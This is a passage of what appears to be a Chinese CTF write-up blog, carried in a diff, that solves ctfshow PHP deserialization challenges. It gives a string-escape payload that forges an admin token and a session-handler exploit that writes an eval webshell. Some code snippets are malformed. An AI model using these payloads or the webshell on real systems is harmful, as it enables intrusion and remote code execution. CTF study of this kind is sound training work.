+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nt">__unset</span><span class="o">()</span><span class="err">，</span><span class="nt">当对不可访问属性调用unset</span><span class="o">()</span><span class="nt">时被调用</span><span class="err">。</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nt">__sleep</span><span class="o">()</span><span class="err">，</span><span class="nt">执行serialize</span><span class="o">()</span><span class="nt">时</span><span class="err">，</span><span class="nt">先会调用这个函数</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nt">__wakeup</span><span class="o">()</span><span class="err">，</span><span class="nt">执行unserialize</span><span class="o">()</span><span class="nt">时</span><span class="err">，</span><span class="nt">先会调用这个函数</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nt">__toString</span><span class="o">()</span><span class="err">，</span><span class="nt">类被当成字符串时的回应方法</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nt">__invoke</span><span class="o">()</span><span class="err">，</span><span class="nt">调用函数的方式调用一个对象时的回应方法</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nt">__set_state</span><span class="o">()</span><span class="err">，</span><span class="nt">调用var_export</span><span class="o">()</span><span class="nt">导出类时</span><span class="err">，</span><span class="nt">此静态方法会被调用</span><span class="err">。</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="nt">__clone</span><span class="o">()</span><span class="err">，</span><span class="nt">当对象复制完成时调用</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="nt">__autoload</span><span class="o">()</span><span class="err">，</span><span class="nt">尝试加载未定义的类</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="nt">__debugInfo</span><span class="o">()</span><span class="err">，</span><span class="nt">打印所需调试信息</span>
+</span></span></code></pre></div><h4 id="web254">web254<a hidden class="anchor" aria-hidden="true" href="#web254">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">
+</span></span><span class="line"><span class="ln">3</span><span class="cl">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span class="cp">?&gt;</span><span class="err">&#39;;
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">    public $code=&#39;xrntkk&#39;;
+</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="err">$poc = new ctfshowvip();
+</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="err">echo urlencode(serialize($poc));
+</span></span></span></code></pre></div><h4 id="web262">web262<a hidden class="anchor" aria-hidden="true" href="#web262">#</a></h4>
+<p>字符串逃逸</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-03 02:37:19
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-03 16:05:38
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @message.php
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">class</span> <span class="nc">message</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">public</span> <span class="nv">$from</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$msg</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$to</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$token</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$m</span><span class="p">,</span><span class="nv">$t</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">from</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">msg</span> <span class="o">=</span> <span class="nv">$m</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">to</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="nv">$m</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;m&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="nv">$t</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$t</span><span class="p">)){</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">message</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$m</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="nv">$umsg</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;fuck&#39;</span><span class="p">,</span> <span class="s1">&#39;loveU&#39;</span><span class="p">,</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$msg</span><span class="p">));</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span><span class="p">,</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$umsg</span><span class="p">));</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Your message has been sent&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl">
+</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span></code></pre></div><p>message.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-03 15:13:03
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-03 15:17:17
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">class</span> <span class="nc">message</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">public</span> <span class="nv">$from</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">public</span> <span class="nv">$msg</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">public</span> <span class="nv">$to</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$token</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$m</span><span class="p">,</span><span class="nv">$t</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">from</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">msg</span> <span class="o">=</span> <span class="nv">$m</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">to</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$msg</span><span class="o">-&gt;</span><span class="na">token</span><span class="o">==</span><span class="s1">&#39;admin&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们的目的就是想办法让token等于admin</p>
+<p>信息传输的过程中使用的序列化和反序列化，存在字符串逃逸，通过逃逸我们可以使token=admin</p>
+<p>之前写过我就懒得重新写了</p>
+<p><a href="https://ctf.show/writeups/706838">https://ctf.show/writeups/706838</a></p>
+<p><img alt="image-20250228003417179" loading="lazy" src="../assets/image-20250228003417179.png"></p>
+<p>首先先生成一段序列</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">class</span> <span class="nc">message</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">public</span> <span class="nv">$from</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">public</span> <span class="nv">$msg</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">public</span> <span class="nv">$to</span> <span class="o">=</span> <span class="s1">&#39;123&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">public</span> <span class="nv">$token</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">message</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;message&#34;</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;from&#34;</span><span class="p">;</span><span class="nx">N</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;msg&#34;</span><span class="p">;</span><span class="nx">N</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">&#34;to&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;123&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;token&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;}</span>
+</span></span></code></pre></div><p>截取后面一部分作为to的值传入</p>
+<p>payload:</p>
+<pre tabindex="0"><code>?f=&amp;m=&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}
+</code></pre><h4 id="web263">web263<a hidden class="anchor" aria-hidden="true" href="#web263">#</a></h4>
+<p><img alt="image-20250228004020214" loading="lazy" src="../assets/image-20250228004020214.png"></p>
+<p>访问/www.zip拿到源码</p>
+<p>审计代码我们可以在/inc/inc.php中找到这样一个危险方法</p>
+<p><img alt="image-20250228005856300" loading="lazy" src="../assets/image-20250228005856300.png"></p>
+<p>假如username和password可控，我们就可以写入木马</p>
+<p>但是这是一个__destruct方法，想要触发必须要经过反序列化，那这道题哪里有进行反序列的地方呢</p>
+<p><a href="https://xz.aliyun.com/news/6244?time__1311=YqIxBDgDnD07qGNKeeqBIK0KdAKe%2B70%2BfbD&amp;u_atoken=d15fdd66ae728e3bfa83f1dbe7fa90e3&amp;u_asig=1a0c399817406759936298578e00ef">文章 - 带你走进PHP session反序列化漏洞 - 先知社区</a></p>
+<p>这篇文章讲得很详细</p>
+<p>归根结底这个漏洞之所以存在是由于序列化和反序列化时使用的处理器不同造成的</p>
+<p><code>session.serialize_handler</code>定义的引擎有三种，如下表所示：</p>
+<table>
+  <thead>
+      <tr>
+          <th>处理器名称</th>
+          <th>存储格式</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>php</td>
+          <td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+      </tr>
+      <tr>
+          <td>php_binary</td>
+          <td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
+      </tr>
+      <tr>
+          <td>php_serialize</td>
+          <td>经过serialize()函数序列化处理的<strong>数组</strong></td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>注：自 PHP 5.5.4 起可以使用 php_serialize</strong></p>
+<p>这道题的php版本为7.3.11，默认使用的处理器为php_serialize</p>
+<p>而在/inc/inc.php中却设置处理器为php</p>
+<p>也就是说序列化和反序列化所使用的处理器不同</p>
+<p>所以我们可以根据php处理器的格式构造出payload</p>
+<p>exp：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s1">&#39;1.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="o">.</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">User</span><span class="p">())));</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>我们将cookie中的limit修改为我们序列化后的结果</p>
+<p>/index.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;limit&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;limti&#39;</span><span class="p">]</span><span class="o">&gt;</span><span class="mi">5</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">&#34;登陆失败次数超过限制&#34;</span><span class="p">)</span><span class="o">:</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;limit&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;limit&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">		<span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;limit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;limit&#39;</span><span class="p">])</span> <span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">		 <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;limit&#34;</span><span class="p">,</span><span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">		 <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;limit&#39;</span><span class="p">]</span><span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p><img alt="image-20250228012705035" loading="lazy" src="../assets/image-20250228012705035.png"></p>
+<p>修改后访问/check.php进行反序列化</p>
+<p>最后访问/log-1.php</p>
+<p><img alt="image-20250228122708718" loading="lazy" src="../assets/image-20250228122708718.png"></p>
+<p>成功写入</p>
+<h4 id="web264">web264<a hidden class="anchor" aria-hidden="true" href="#web264">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-12-03 02:37:19
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-12-03 16:05:38
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @message.php
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">class</span> <span class="nc">message</span><span class="p">{</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">public</span> <span class="nv">$from</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">public</span> <span class="nv">$msg</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">public</span> <span class="nv">$to</span><span class="p">;</span><span class="mi">1</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$m</span><span class="p">,</span><span class="nv">$t</span><span class="p">){</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">from</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">msg</span> <span class="o">=</span> <span class="nv">$m</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">to</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="nv">$m</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;m&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="nv">$t</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;t&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">
+</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$t</span><span class="p">)){</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="nv">$msg</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">message</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$m</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="nv">$umsg</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;fuck&#39;</span><span class="p">,</span> <span class="s1">&#39;loveU&#39;</span><span class="p">,</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$msg</span><span class="p">));</span>
